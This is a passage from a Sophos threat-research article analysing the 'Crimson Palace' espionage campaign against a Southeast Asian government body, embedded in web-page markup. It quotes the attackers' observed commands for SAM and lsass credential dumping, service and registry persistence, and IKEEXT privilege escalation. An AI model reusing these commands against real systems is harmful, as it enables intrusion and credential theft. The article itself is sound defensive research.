2.495-6.826C71.149.726 73.175.158 75.497.158c2.938 0 5.284.913 6.543 2.54zM65.36.279h-3.507v6.73h-6.345V.278h-3.507v16.439h3.507V9.94h6.345v6.778h3.506V.278zM43.533 8.042c.938 0 1.48-.123 1.852-.469.442-.37.715-1.158.715-2.07 0-1.084-.443-1.872-1.208-2.144-.272-.1-.717-.149-1.286-.149h-4.839v4.832h4.766zm-4.766 8.674h-3.507V.278h8.223c2.889 0 3.902.295 4.988 1.504.964 1.036 1.481 2.39 1.481 3.845 0 1.725-.69 3.327-1.826 4.289-.962.813-1.854 1.058-3.728 1.058h-5.63v5.743zM21.665 4.596c-.519.813-.764 2.118-.764 3.87 0 3.845 1.333 5.595 4.297 5.595 2.913 0 4.247-1.75 4.247-5.546 0-3.847-1.308-5.571-4.247-5.571-1.606 0-2.866.592-3.533 1.652zm10.052-1.897c1.014 1.33 1.581 3.498 1.581 6.039 0 2.882-.914 5.249-2.545 6.555-1.233.986-3.11 1.528-5.333 1.528-3.162 0-5.656-1.037-6.94-2.884-.964-1.355-1.432-3.155-1.432-5.35 0-3.152.865-5.544 2.496-6.826C20.825.726 22.85.158 25.173.158c2.938 0 5.286.913 6.544 2.54z"/>
					</g>
				</svg>
				</a>
			</div>

			<!-- Search Field -->
			<div class="lg:flex justify-end flex-grow hidden" x-show="searchField" x-cloak>
				<div class="relative w-1/2 rounded-md shadow-sm">
					<form role="search" method="get" action="https://news.sophos.com/en-us/">
						<input
							type="text"
							class="block w-full text-lg text-white placeholder-gray-100 bg-blue-800 border-0 rounded-md font-sansMedium font-medium"
							placeholder="Type to Search News"
							x-ref="searchInput"
							name="s"
						/>
						<div class="absolute inset-y-0 right-0 flex items-center px-3">
							<button
								class="hover:opacity-100 opacity-60 p-1 text-xs text-white uppercase rounded-full cursor-pointer"
								type="submit"
							>
								Search							</button>
						</div>
					</form>
				</div>
			</div>

			<!-- Main Nav -->
			<div class="lg:flex items-center flex-grow hidden" x-show="!searchField" x-cloak>
				<div class="flex ml-auto">
				<ul id="menu-en-us-primary" class="primary-menu"><li id="menu-item-77773" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li id="menu-item-77772" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li id="menu-item-77774" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-85326" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-951374" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-951374"><a href="https://news.sophos.com/en-us/category/serious-security/">Naked Security<div class="menu-item-description"></div></a></li>
<li id="menu-item-83702" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>				</div>
			</div>

			<!-- Search button -->
			<div class="lg:block hidden ml-4">
				<div class="flex items-center">
					<button
					class="border-2 border-transparent hover:border-white inline-flex items-center justify-center p-2 text-white rounded-md focus:outline-none transition-colors"
					@click.prevent="searchField = !searchField; $nextTick(() => { setTimeout(() => { $refs.searchInput.focus(); }, 150);});"
					>
						<span class="sr-only">Search</span>
						<!-- Heroicon name: outline/bell -->
						<svg
							class="w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							:class="{ 'block': !searchField, 'hidden': searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
							/>
						</svg>
						<svg
							class="hidden w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							aria-hidden="true"
							:class="{ 'block': searchField, 'hidden': !searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M6 18L18 6M6 6l12 12"
							/>
						</svg>
					</button>
				</div>
			</div>

			<!-- Mobile menu button -->
			<div class="lg:hidden flex -mr-2">
				<button
					type="button"
					class="hover:text-white hover:bg-blue-800 focus:outline-none hover:ring-2 focus:ring-offset-2 focus:ring-offset-gray-300 focus:ring-white inline-flex items-center justify-center p-2 text-white rounded-md"
					aria-controls="mobile-menu"
					aria-expanded="false"
					@click="mobileMenu = !mobileMenu"
				>
					<span class="sr-only">Open main menu</span>
					<!--
						Heroicon name: outline/menu

						Menu open: "hidden", Menu closed: "block"
					-->
					<svg
					class="block w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					:class="{ 'block': !mobileMenu, 'hidden': mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M4 6h16M4 12h16m-7 6h7"
					/>
					</svg>
					<!--
						Heroicon name: outline/x

						Menu open: "block", Menu closed: "hidden"
					-->
					<svg
					class="hidden w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					aria-hidden="true"
					:class="{ 'block': mobileMenu, 'hidden': !mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M6 18L18 6M6 6l12 12"
					/>
					</svg>
				</button>
			</div>
		</div>
	</div>

	<!-- Mobile menu, show/hide based on menu state. -->
	<div
	class="lg:hidden container"
	x-show="mobileMenu"
	x-cloak
	x-transition:enter="transition-all ease-out duration-100"
	x-transition:enter-start="transform opacity-0 scale-95"
	x-transition:enter-end="transform opacity-100 scale-100"
	x-transition:leave="transition ease-in duration-75"
	x-transition:leave-start="transform opacity-100 scale-100"
	x-transition:leave-end="transform opacity-0 scale-95"
	>
		<div class="pt-2 pb-8 space-y-2">
			<div class="relative rounded-md shadow-sm">
				<form role="search" method="get" action="https://news.sophos.com/en-us/">
					<input
						type="text"
						class="focus:ring-blue-600 focus:border-blue-600 sm:text-sm block w-full placeholder-gray-600 border-gray-300 rounded-md"
						placeholder="Search News"
						name="s"
					/>
					<div
						class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none"
					>
						<button class="p-1 text-gray-500 rounded-full" type="submit">
							<span class="sr-only">Search</span>
							<!-- Heroicon name: outline/bell -->
							<svg
								class="w-4 h-4"
								xmlns="http://www.w3.org/2000/svg"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor"
							>
								<path
									stroke-linecap="round"
									stroke-linejoin="round"
									stroke-width="3"
									d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
								/>
							</svg>
						</button>
					</div>
				</form>
			</div>

			<ul id="menu-en-us-primary-1" class="mobile-menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-951374"><a href="https://news.sophos.com/en-us/category/serious-security/">Naked Security<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>		</div>
	</div>
</header>

	<div id="content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-955433" class="post-955433 post type-post status-publish format-standard has-post-thumbnail hentry category-security-operations category-threat-research tag-crimson-palace tag-sophos-x-ops region-en-us">

		<div class="md:mt-16 container mt-8">
		<div class="relative max-w-5xl mx-auto">
				<div
						class="aspect-w-16 aspect-h-9 flex bg-gray-400 bg-right bg-no-repeat bg-cover"
				>
					<img width="1200" height="800" src="https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?w=1200" class="object-cover wp-post-image" alt="palace in china" decoding="async" fetchpriority="high" srcset="https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg 5746w, https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?resize=300,200 300w, https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?resize=768,512 768w, https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?resize=1024,683 1024w, https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?resize=1536,1024 1536w, https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?resize=2048,1365 2048w" sizes="(max-width: 1200px) 100vw, 1200px" />				</div>
								<div
						class="left-4 w-24 h-24 lg:left-12 xl:left-16 lg:w-40 lg:h-40 place-items-center absolute top-0 grid  "
				>
										<img
							src="https://news.sophos.com/wp-content/uploads/2022/07/Category-Icon-X-Ops-v2.png"
							alt="Threat Research"
					/>
														</div>
						</div>
	</div>


			
	<header>
		<div class="container mt-8 md:mt-16 md:-mb-4">
			<div class="max-w-4xl mx-auto">

				<h1 class="text-style-h1 mb-8">Operation Crimson Palace: A Technical Deep Dive</h1>
				
				<div class="text-xl md:text-xl -mt-2">
					<span class="byline">
		Written by 				<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/morgan-demboski/" title="Posts by Morgan Demboski" class="author url fn" rel="author">Morgan Demboski</a>,				</span>
										<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/paul-jaramillo/" title="Posts by Paul Jaramillo" class="author url fn" rel="author">Paul Jaramillo</a>,				</span>
										<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/mark-parsons/" title="Posts by Mark Parsons" class="author url fn" rel="author">Mark Parsons</a>				</span>
								</span>
						</div>

				<div class="text-sophos-gray-600 mt-4 text-xs font-sansSemiBold font-semibold leading-tight uppercase">
					<span class="posted-on"><a href="https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive/" rel="bookmark">June 05, 2024</a></span>				</div>

				<div class="mt-6 space-y-2 space-x-1">
					<a href="https://news.sophos.com/en-us/category/security-operations/" class="category-tag-pill">Security Operations</a> <a href="https://news.sophos.com/en-us/category/threat-research/" class="category-tag-pill">Threat Research</a> <a href="https://news.sophos.com/en-us/tag/crimson-palace/" class="category-tag-pill">Crimson Palace</a> <a href="https://news.sophos.com/en-us/tag/sophos-x-ops/" class="category-tag-pill">Sophos X-Ops</a>				</div>
			</div>
		</div>
	</header><!-- .entry-header -->

	<div class="container md:my-16 xl:my-24 my-8">
	<div class="entry-content lg:prose-lg mx-auto prose max-w-4xl">
		<p>Sophos Managed Detection and Response initiated a threat hunt across all customers after the detection of abuse of a vulnerable legitimate VMware executable (vmnat.exe) to perform dynamic link library (DLL) side-loading on one customer’s network. In a search for similar incidents in telemetry, MDR ultimately uncovered a complex, persistent cyberespionage campaign targeting a high-profile government organization in Southeast Asia. As described in <a href="https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-sophos-threat-hunting-unveils-multiple-clusters-of-chinese-state-sponsored-activity-targeting-southeast-asia/">the first part of this report</a>, we identified at least three distinct clusters of intrusion activity present in the organization’s network from at least March 2023 through December 2023.</p>
<p>The three security threat activity clusters—which we designated as Alpha (STAC1248), Bravo (STAC1870), and Charlie (STAC1305) – are assessed with high confidence to operate on behalf of Chinese state interests. In this continuation of our report, we will provide deeper technical analysis of the three activity clusters, including the tactics, techniques, and procedures (TTPs) used in the campaign, aligned to activity clusters where possible. We also provide additional technical details on prior compromises within the same organization that appear to be connected to the campaign.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2024/05/venn-updated-co.jpg"><img decoding="async" class="wp-image-955536 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/venn-updated-co.jpg" alt="" width="900" height="791" srcset="https://news.sophos.com/wp-content/uploads/2024/05/venn-updated-co.jpg 900w, https://news.sophos.com/wp-content/uploads/2024/05/venn-updated-co.jpg?resize=300,264 300w, https://news.sophos.com/wp-content/uploads/2024/05/venn-updated-co.jpg?resize=768,675 768w" sizes="(max-width: 900px) 100vw, 900px" /></a>Figure 1. Venn diagram showing distinction and overlap of the three security threat clusters uncovered during the Crimson Palace investigation, including connections to previously known threat actor groups.</p>
<p>&nbsp;</p>
<table>
<tbody>
<tr>
<td>
<h2>Table of Contents</h2>
</td>
</tr>
<tr>
<td><a href="#prior-compromise">Prior compromise</a></p>
<ul>
<li><a href="#nupakage">March 2022 NUPAKAGE Detection</a></li>
<li><a href="#dll-stitching">December 2022 DLL-Stitching incident</a></li>
</ul>
<ul>
<li style="list-style-type: none"></li>
</ul>
</td>
</tr>
<tr>
<td><a href="#cluster-alpha">Cluster Alpha</a> (STAC1248)</p>
<ul>
<li><a href="#alpha-access">Credential Access</a></li>
<li><a href="#alpha-discovery">Discovery</a></li>
<li><a href="#alpha-lateral">Lateral Movement</a></li>
<li><a href="#alpha-persistence">Persistence / Privilege Escalation</a></li>
<li><a href="#alpha-c2">Command and Control (C2)</a></li>
<li><a href="#alpha-evasion">Defense Evasion</a></li>
</ul>
</td>
</tr>
<tr>
<td><a href="#cluster-bravo">Cluster Bravo</a> (STAC1870)</p>
<ul>
<li><a href="#b-discovery">Discovery</a></li>
<li><a href="#b-creds">Credential Access</a></li>
<li><a href="#b-lateral">Lateral Movement</a></li>
<li><a href="#b-persist">Persistence / Privilege Escalation</a></li>
<li><a href="#b-c2">C2</a></li>
<li><a href="#b-evade">Defense Evasion</a></li>
</ul>
</td>
</tr>
<tr>
<td><a href="#cluster-charlie">Cluster Charlie</a> (STAC1305)</p>
<ul>
<li><a href="#c-discovery">Discovery</a></li>
<li><a href="#c-creds">Credential Access</a></li>
<li><a href="#c-lateral">Lateral Movement</a></li>
<li><a href="#c-persist">Persistence / Privilege Escalation</a></li>
<li><a href="#c-c2">C2</a></li>
<li><a href="#c-evade">Defense Evasion</a></li>
<li><a href="#c-exfil">Exfiltration</a></li>
</ul>
</td>
</tr>
<tr>
<td><a href="#iocs">Indicators of Compromise</a></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h2 id="prior-compromise">Prior compromise</h2>
<p>While initial access occurred outside the scope of Sophos’s coverage within the targeted organization, we were able to observe evidence of related activity dating back to early 2022, leading us to suspect the threat actors had long-standing access to unmanaged assets within the network.</p>
<h4 id="nupakage">March 2022 NUPAKAGE Detection</h4>
<p>PowerShell Script Block logs from March 2022 indicate the adversary was using <strong>check.exe</strong> to collect specific file types modified after January 1, 2021. The binary was copied from the Group Policy Object (GPO) path ‘<strong>SYSVOL’ </strong>to ‘<strong>C:\Users\Public’</strong> and deleted after execution.</p>
<p>Upon analysis, Sophos Labs identified <strong>check.exe </strong>as the tool NUPAKAGE, which has been <a href="https://www.trendmicro.com/en_ph/research/23/c/earth-preta-updated-stealthy-strategies.html">publicly attributed by Trend Micro</a> to the Chinese threat group Earth Preta (which overlaps with CrowdStrike’s Mustang Panda). This activity is identified by Sophos detection <strong>Troj/Steal-BLP</strong>.</p>
<pre><em>'C:\users\public\check.exe 20210101 "txt;doc;docx;xls;xlsx;pdf'</em></pre>
<h4 id="dll-stitching">December 2022 DLL-Stitching Incident</h4>
<p>When the organization enrolled a subset of endpoints with Sophos’ MDR service, multiple detections of  suspicious activities on those endpoints prompted investigations. These included a December 2022 investigation into intrusion activity where DLL-stitching was used to obfuscate and deploy two malicious backdoors on target domain controllers. The attacker created two DLLs (<strong>swprvs.dll</strong> and <strong>appmgmt.dll</strong>) and replaced the legitimate Shadow Copy Provider Service and Application Management Service DLL paths in the registry. An ‘s’ was added to the filename of the legitimate <strong>swprv.dll</strong> and the <strong>‘s’ was removed </strong>from the legitimate <strong>appmgmts.dll.</strong></p>
<pre>cmd.exe /Q /c reg add HKLM\SYSTEM\CurrentControlSet\Services\swprv\Parameters /v ServiceDll /t REG_EXPAND_SZ /d "%SystemRoot%\system32\swprvs.dll" /f 1&gt; \\127.0.0.1\ADMIN$\__&lt;redacted&gt;.399847 2&gt;&amp;1</pre>
<p>To pad the masquerading <strong>appmgmt.dll</strong>, the threat actor used Impacket to stitch the open-source multi-feature proxy tool <a href="https://github.com/ph4ntonn/Stowaway">Stowaway</a> (<strong>msoe.dll</strong>) with all DLLs starting with ‘d’ from the <strong>‘system32’ </strong>directory, resulting in more than 90 executables being stitched one after another into a single DLL.</p>
<pre>cmd.exe /Q /c copy /b c:\windows\temp\msoe.dll +c:\windows\system32\d*.dll c:\windows\temp\appmgmt.dll 1&gt; \\127.0.0.1\ADMIN$\__&lt;redacted&gt; 2&gt;&amp;1“.</pre>
<figure id="attachment_955526" aria-describedby="caption-attachment-955526" style="width: 656px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Export-library-of-appmgmt.dll-with-2863-exported-functions-copy.jpg"><img decoding="async" class="wp-image-955526 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Export-library-of-appmgmt.dll-with-2863-exported-functions-copy.jpg" alt="" width="656" height="458" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Export-library-of-appmgmt.dll-with-2863-exported-functions-copy.jpg 656w, https://news.sophos.com/wp-content/uploads/2024/05/Export-library-of-appmgmt.dll-with-2863-exported-functions-copy.jpg?resize=300,209 300w" sizes="(max-width: 656px) 100vw, 656px" /></a><figcaption id="caption-attachment-955526" class="wp-caption-text">Figure 2: The exports of the masquerading appmgmt.dll</figcaption></figure>
<p>While there were no direct observations around the creation of <strong>swprv.dll</strong>, static analysis indicated the DLL consisted of roughly 120 executables stitched together, including a malicious RAT (<strong>lib.dat</strong>) with basic functionalities, such as the ability to read and write files and establish C2 communications. Sophos Labs analysts determined the tool uses the RC4 algorithm to encrypt and decrypt the files used by the malware.</p>
<figure id="attachment_955527" aria-describedby="caption-attachment-955527" style="width: 855px" class="wp-caption alignnone"><a href="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-source-code-of-swprv.dll-sample-showing-basic-RAT-commands-1.png"><img loading="lazy" decoding="async" class="wp-image-955527 size-full" src="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-source-code-of-swprv.dll-sample-showing-basic-RAT-commands-1.png" alt="" width="855" height="751" srcset="https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-source-code-of-swprv.dll-sample-showing-basic-RAT-commands-1.png 855w, https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-source-code-of-swprv.dll-sample-showing-basic-RAT-commands-1.png?resize=300,264 300w, https://news.sophos.com/wp-content/uploads/2024/05/Reverse-engineered-source-code-of-swprv.dll-sample-showing-basic-RAT-commands-1.png?resize=768,675 768w" sizes="(max-width: 855px) 100vw, 855px" /></a><figcaption id="caption-attachment-955527" class="wp-caption-text">Figure 3: Reverse engineered source code of swprv.dll sample showing basic RAT commands</figcaption></figure>
<p>As a result of the Labs analysis, detections <strong>Troj/Backdr-NX</strong> and <strong>ATK/Stowaway-C</strong> were deployed across Sophos customers to detect the stitched DLL payloads, and a behavioral detection was created to detect when a Service DLL is added to the registry.</p>
<p>Indicators of compromise for these prior events can be found on the Sophos GitHub page<a href="https://github.com/sophoslabs/IoCs/blob/master/crimson_palace_prior_intrusions.csv"> here</a>.</p>
<h2 id="cluster-alpha">Cluster Alpha (STAC1248)</h2>
<p>&nbsp;</p>
<h2 id="alpha-access">Credential Access:</h2>
<h4>SAM Registry Hive Dump</h4>
<p>On March 6, a compromised administrator account was used to pivot from an unmanaged asset to a domain controller. Once connected, the actor harvested credentials using a common technique, “<strong><em>reg save hklm\sam sam</em></strong>”, to target the Security Accounts Manager (SAM) registry hive.</p>
<h4>Attempted Credential Dumps</h4>
<p>Later in the intrusion, the threat actor attempted a remote registry dump, “<strong><em>C:\Windows\system32\svchost.exe -k localService -p -s RemoteRegistry</em></strong>”, but the file output (‘<strong>C<em>:\Windows\System32\PrIwouGs.tmp’</em></strong>) was immediately removed by the Sophos agent. In August, Sophos MDR observed a further attempt to use a renamed Process Explorer (<strong>p64.exe</strong>) to collect more credentials, “<strong><em>p64.exe -accepteula -ma lsass.exe 1.dmp</em></strong>”, but was again blocked by Sophos controls.</p>
<h2 id="alpha-discovery">Discovery:</h2>
<h4>Domain Enumeration</h4>
<p>In mid-March 2023, the actor was observed using valid administrator credentials to perform discovery on a domain controller, focused primarily on domain enumeration:</p>
<ul>
<li><strong>Net group /domain </strong></li>
<li><strong>Net group “domain admins” /domain</strong></li>
<li><strong>Net group &#8220;domain controllers&#8221; /domain</strong></li>
<li><strong>Nltest /domain_trusts</strong></li>
<li><strong>Net session</strong></li>
<li><strong>Net use </strong><strong>\\&lt;IP&gt;</strong></li>
<li><strong>Net user sophos</strong></li>
<li><strong>Net user sophos /domain</strong></li>
</ul>
<p>Additional enumeration efforts occurred in May as the actor ran commands to target specific domains and DNS records across multiple domain controllers, which enabled them to quickly identify users with administrative rights and the systems used for authentication. Sophos observed Cluster Alpha activity simultaneously on different domain controllers, indicating a comprehensive approach to harvesting information from each domain controller independently.</p>
<ul>
<li><strong>Net localgroup administrators</strong></li>
<li><strong>dnscmd . /EnumRecords &lt;domain&gt;</strong></li>
<li><strong>dsquery server</strong></li>
<li><strong>dsquery * &#8220;CN=Configuration,DC=&lt;redacted&gt;,DC=local&#8221; -Filter &#8220;(objectcategory=msExchExchangeServer)&#8221;</strong></li>
<li><strong>dnscmd . /EnumRecords &lt;domain&gt;</strong></li>
<li><strong>dnscmd . /EnumZones</strong></li>
</ul>
<h4>PowerShell scripts</h4>
<p>The actor also leveraged PowerShell modules, such as<strong> Get-UserLogon</strong> and <strong>Get-EventLog, </strong>to enumerate discovery information in a stealthier manner. While the scope of this reconnaissance  was limited to administrative users in May, the list expanded to a larger list of users in June.</p>
<p>By capturing the Event ID 4624 events in a formatted list, the actor was likely trying to confirm which systems were accessible by the targeted accounts. The command output was then saved to <strong>MicrosoftUpdate.dat </strong>and<strong> rsc.dat</strong> in the temporary directory.</p>
<pre>cmd.exe /C powershell -command "Get-UserLogon -all|out-file C:\Users\&lt;redacted&gt;\AppData\Local\Temp\MicrosoftUpdate.dat" &gt; C:\Windows\Temp\swqEqUBj.tmp 2&gt;&amp;1
cmd.exe /C powershell.exe -exec bypass -Command " Get-EventLog -LogName Security -After '2023/03/01 00:00' | Where-Object {$_.eventid -eq 4624 -and $_.Message-like '*&lt;redacted&gt;*'} | Format-List|out-file -filepath C:\Users\&lt;redacted&gt;\AppData\Local\Temp\MicrosoftUpdate.dat" &gt; C:\Windows\Temp\BBXJcedO.tmp 2&gt;&amp;1</pre>
<p>During these discovery efforts, the actor promptly cleaned up their tools and reconnaissance output.</p>
<pre>cmd.exe /C del /q "C:\Program Files\WindowsPowerShell\Modules\Get-UserLogon\Get-UserLogon.psm1" &gt; C:\Windows\Temp\nTJTUUlN.tmp 2&gt;&amp;1
cmd.exe /C del /q C:\Users\&lt;redacted&gt;\AppData\Local\Temp\MicrosoftUpdate.dat &gt; C:\Windows\Temp\sFfOvAwR.tmp 2&gt;&amp;1</pre>
<h4>Collection &amp; Staging</h4>
<p>In preparation to transfer the large collection of internal discovery data, the actor compressed the data using a renamed WinRAR command line tool (<strong>winsc.exe</strong>).</p>
<pre>cmd.exe /C C:\Users\&lt;redacted&gt;\AppData\Local\Temp\winsc.exe a C:\Users\&lt;redacted&gt;\AppData\Local\Temp\rsc.dat C:\Users\&lt;redacted&gt;\AppData\Local\Temp\MicrosoftUpdate.dat &gt; C:\Windows\Temp\YnlIdMii.tmp 2&gt;&amp;1</pre>
<h2 id="alpha-lateral">Lateral Movement:</h2>
<h4>Net use and wmic</h4>
<p>For lateral movement March and April, the actor used traditional <strong>net use</strong> and <strong>wmic</strong> commands to move to additional machines via valid accounts.</p>
<pre>net use \\172.27.&lt;redacted&gt;
wmic  /node:"172.27.&lt;redacted&gt;"   /user:"&lt;redacted&gt;"   /password:"&lt;redacted&gt;"   process call create "c:\programdata\vmnat\vmtools\vmnat.exe"</pre>
<p>The actor typed the wrong slash in their authentications to demarcate the domain from the username, which temporarily prevented further lateral movement. We assess with high confidence that this is indicative of non-automated activity. In a later instance, the attacker mistakenly appended their own machine’s domain to the authentications.</p>
<p>They hastily changed to different credentials. We believe this was because they incorrectly assumed that their compromised credentials had been disabled. As a result, the MDR hunt team was able to identify additional compromised accounts.</p>
<h4>RDP, Impacket, and PSEXEC</h4>
<p>We also observed Remote Desktop Protocol (RDP) activity in Cluster Alpha, including the <strong>rdpclip function </strong>to cut and paste data from their remote sessions. Beginning in April, and at a much higher frequency in May, the actor used the <strong>atexec </strong>and <strong>smbexec Impacket modules</strong> to remotely execute commands. They also attempted to use PSEXEC renamed as <strong>bypassrpc.exe</strong> for remote execution, but this activity was blocked by the Sophos agent.</p>
<h2 id="alpha-persistence">Persistence/ Privilege Escalation:</h2>
<h4>Registry Key Creation</h4>
<p>Following the deployment in March of a copy of a legitimate version of vmnat.exe (the VMware NAT service)—the pattern of attack that triggered the initial threat hunt—the actor was observed creating registry keys to establish persistence.</p>
<pre>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmnattools\Parameters /v Application /t REG_SZ /d c:\programdata\microsoft\vmware\vmnat\vmtools\vmnat.exe /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmnattools\Parameters /v AppDirectory /t REG_SZ /d c:\programdata\microsoft\vmware\vmnat\vmtools /f</pre>
<h4>Service Creation – Vmnat via INSTSRV.EXE and Srvany.exe</h4>
<p>On multiple occasions, the threat actor chained together two uncommon LOLBins – <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/create-user-defined-service"><strong>instsrv.exe </strong>and<strong> srvany.exe</strong></a> – to create a service using the exploited vmnat.exe, which provided persistence with system-level  privileges.</p>
<pre>c:\programdata\microsoft\vmware\vmnat\vmtools\instsrv.exe vmnattools c:\programdata\microsoft\vmware\vmnat\vmtools\srvany.exe</pre>
<h4>Windows Services Abuse</h4>
<p>Sophos MDR hunters also repeatedly observed the actor in Cluster Alpha attempting to escalate privileges by modifying permissions for the IKEEXT service. The first attempt occurred in June when a PhantomNet implant (<strong>sslwnd64.exe</strong>) created malicious files <strong>wlbsctrl.dll</strong> and <strong>TSVIPSrv.dll</strong> and migrated them to the <strong>‘System32’</strong> directory to be loaded by <strong>svchost.exe</strong>. Simultaneously, the implant spawned a command session to restart the SessionEnv and IKEEXT services, which then loaded <strong>wlbsctrl.dll</strong> and <strong>TSVIPSrv.dll </strong>respectively<strong>. </strong>When the service was restarted, commands were executed to modify the permissions for the IKEEXT service in the registry.</p>
<p>A week later, the threat actor launched a batch file (<strong>setup.bat</strong>) to deploy a different version of <strong>TSVIPSrv.dll</strong> to disk and migrated it to ‘<strong>C:\Windows\SysWOW64</strong>’. In a similar sequence, <strong>setup.bat </strong>stopped and started the IKEEXT service and modified IKEEXT permissions in the registry.</p>
<pre>Net stop IKEEXT
reg add hklm\SYSTEM\CurrentControlSet\Services\IKEEXT /v RequiredPrivileges /t REG_MULTI_SZ /d SeAuditPrivilege\0SeBackupPrivilege\
0SeRestorePrivilege\0SeTakeOwnershipPrivilege\0SeImpersonatePrivilege\0SeTcbPrivilege\0SeAssignPrimaryTokenPrivilege\0SeManageVolumePrivilege\
0SeCreateSymbolicLinkPrivilege\0SeShutdownPrivilege /f
sc config IKEEXT  Start= auto
sc config IKEEXT  obj= LocalSystem
net start IKEEXT
C:\Windows\system32\net1 start IKEEXT</pre>
<p>By <a href="https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992">loading the DLLs in this way</a>, the IKEEXT service was infected with new variants of <a href="#alpha-evasion">EAGERBEE malware (<strong>wlbsctrl.dll </strong>and <strong>TSVIPSrv.dll</strong>)</a> , while the registry key additions gave the infected service additional unauthorized privileges. Specifically, the actor invoked a series of token privileges, including <strong>SeBackupPrivilege</strong>, <strong>SeRestorePrivilege</strong>, and <strong>SeTakeOwnershipPrivilege</strong>, which enable read and write access control to any file on the system regardless of ACL or ownership rights. The actor abused these privileges to capture the SAM registry hive and backups of every file, including those containing administrator hashes. Another invoked privilege was <strong>SeTcbPrivilege</strong>, which can be used to modify process-level access tokens and impersonate other users without having to know their credentials.</p>
<h2 id="alpha-c2">Command-and-Control (C2):</h2>
<h4>Sideloading a Merlin C2 Agent</h4>
<p>We observed the first persistence mechanism used in Cluster Alpha in March, when the attacker deployed , an open-source C2 tool written in Golang. To deploy the payload, the actor leveraged a legitimate version of <strong>vmnat.exe</strong> to sideload <strong>SHFOLDER.dll</strong>, which loaded the Merlin C2 Agent as <strong>vmnat.dll</strong>. Notably, this observed sideloading chain closely resembles a process described in a  report to deploy a Merlin Agent by a Chinese threat group tracked as BackdoorDiplomacy.</p>
